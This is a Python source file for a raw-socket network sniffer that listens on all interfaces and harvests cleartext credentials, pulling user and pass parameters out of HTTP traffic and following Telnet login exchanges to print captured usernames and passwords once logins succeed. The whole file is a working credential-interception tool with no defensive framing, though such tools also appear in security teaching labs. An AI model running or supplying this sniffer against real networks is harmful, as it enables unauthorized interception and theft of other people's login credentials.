import socket
import struct
import re
from datetime import datetime

# Global buffer for Telnet input lines
buffer = b''

# Flag to track session lock
waiting_for_connection = True
waiting_for_username = False
username_captured = False
waiting_for_password = False
telnet_session_locked = False
pending_verification = False
last_login = None
last_password = None


def parse_ip(packet):
    header = struct.unpack('!BBHHHBBH4s4s', packet[:20])
    ihl = (header[0] & 0xF) * 4
    protocol = header[6]
    src_ip = socket.inet_ntoa(header[8])
    dst_ip = socket.inet_ntoa(header[9])
    return src_ip, dst_ip, protocol, ihl, packet[ihl:]


def parse_tcp(segment):
    header = struct.unpack('!HHLLBBHHH', segment[:20])
    data_offset = (header[4] >> 4) * 4
    src_port = header[0]
    dst_port = header[1]
    payload = segment[data_offset:]
    return src_port, dst_port, payload


def apply_backspaces(data: bytes) -> str:
    """
    Process byte input to handle backspace characters (\x08 or \x7f).
    Returns the final interpreted string.
    """
    result = []
    for b in data:
        if b in (0x08, 0x7f):  # Backspace or DEL
            if result:
                result.pop()
        elif 32 <= b < 127:  # Printable ASCII
            result.append(chr(b))
    return ''.join(result)


def capture_credentials(payload, is_from_server, dst_port):
    global buffer, waiting_for_connection, waiting_for_username, username_captured, waiting_for_password, pending_verification, telnet_session_locked, last_login, last_password

    if payload == b'':
        return

    # Match HTTP credentials via URL parameters
    http_match = re.search(
        rb'user=([^&]+)&pass=([^&\s]+)', payload, re.IGNORECASE)
    if http_match:
        user, password = http_match.groups()
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            f"\033[92m[{timestamp}] [HTTP] Credentials captured: {user.decode()}:{password.decode()}\033[0m")
        return

    # For HTTPS traffic (port 443), we can only detect the connection but not the content
    if dst_port == 443 and len(payload) > 0:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            f"\033[94m[{timestamp}] [HTTPS] Encrypted traffic detected (credentials cannot be captured)\033[0m")
        return

    if is_from_server:
        if re.search(b'(Login timed out)', payload, re.IGNORECASE):
            print(f"\033[91m[INFO] Telnet session timed out.\033[0m")
            waiting_for_connection = True
            waiting_for_username = False
            waiting_for_password = False
            pending_verification = False
            telnet_session_locked = False

        elif waiting_for_connection and b'login:' in payload.lower():
            print(f"\033[92m[INFO] Telnet session started.\033[0m")
            waiting_for_connection = False
            waiting_for_username = True

        elif username_captured and re.search(b'(Password)', payload, re.IGNORECASE):
            username_captured = False
            waiting_for_password = True

        elif pending_verification:
            if b'welcome' in payload.lower():
                timestamp = datetime.now().strftime("%H:%M:%S")
                print(
                    f"\033[93m[{timestamp}] [TELNET] Credentials captured: {last_login}:{last_password}\033[0m")
                pending_verification = False
                telnet_session_locked = True
                last_login = None
                last_password = None

            elif re.search(b'(Login incorrect)', payload, re.IGNORECASE):
                print(
                    f"\033[91m[INFO] Telnet authentication failed.\033[0m")
                print(
                    f"\033[91m[WARN] Ignored invalid credentials: {last_login}:{last_password}\033[0m")
                pending_verification = False
                waiting_for_username = True
                last_login = None
                last_password = None

        elif telnet_session_locked and re.search(b'(logout)', payload, re.IGNORECASE):
            print(f"\033[91m[INFO] Telnet session closed.\033[0m")
            telnet_session_locked = False
            waiting_for_connection = True
    else:
        # Remove Telnet IAC commands and subnegotiation blocks
        payload = re.sub(rb'\xff[\xfb-\xfe].', b'', payload)
        payload = re.sub(rb'\xff\xfa.*?\xff\xf0',
                         b'', payload, flags=re.DOTALL)
        if payload.endswith(b'\r') or payload.endswith(b'\n'):
            # Decode the payload and handle backspaces
            decoded_line = apply_backspaces(buffer)
            if waiting_for_username:
                last_login = decoded_line
                print(f"[DEBUG] Captured login: {last_login}")
                waiting_for_username = False
                username_captured = True

            elif waiting_for_password:
                last_password = decoded_line
                print(f"[DEBUG] Captured password: {last_password}")
                waiting_for_password = False
                pending_verification = True

            buffer = b''

        else:
            buffer += payload


def main():
    try:
        # Create raw socket and bind to loopback IP
        sniffer = socket.socket(
            socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sniffer.bind(('0.0.0.0', 0))  # Bind to all interfaces
        sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        print("Sniffer started on all interfaces. Capturing HTTP/HTTPS/Telnet traffic...")
        print("Monitoring for packets...")

        packet_count = 0
        while True:
            packet = sniffer.recvfrom(65535)[0]
            packet_count += 1

            if packet_count % 100 == 0:  # Print every 100th packet for debugging
                print(f"[DEBUG] Processed {packet_count} packets so far...")

            if len(packet) < 20:
                continue

            src_ip, dst_ip, protocol, ihl, transport = parse_ip(packet)

            if protocol == 6:  # TCP
                try:
                    src_port, dst_port, payload = parse_tcp(transport)

                    # Debug: print all TCP traffic
                    if len(payload) > 0:
                        print(
                            f"[DEBUG] TCP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}, payload length: {len(payload)}")

                    if src_port == 23 or dst_port == 23 or dst_port == 80 or dst_port == 443:
                        is_from_server = (src_port == 23)
                        capture_credentials(payload, is_from_server, dst_port)

                except struct.error:
                    continue

    except PermissionError:
        print("ERROR: Run with sudo/root privileges.")
    except KeyboardInterrupt:
        print("\nSniffer stopped.")


if __name__ == "__main__":
    main()
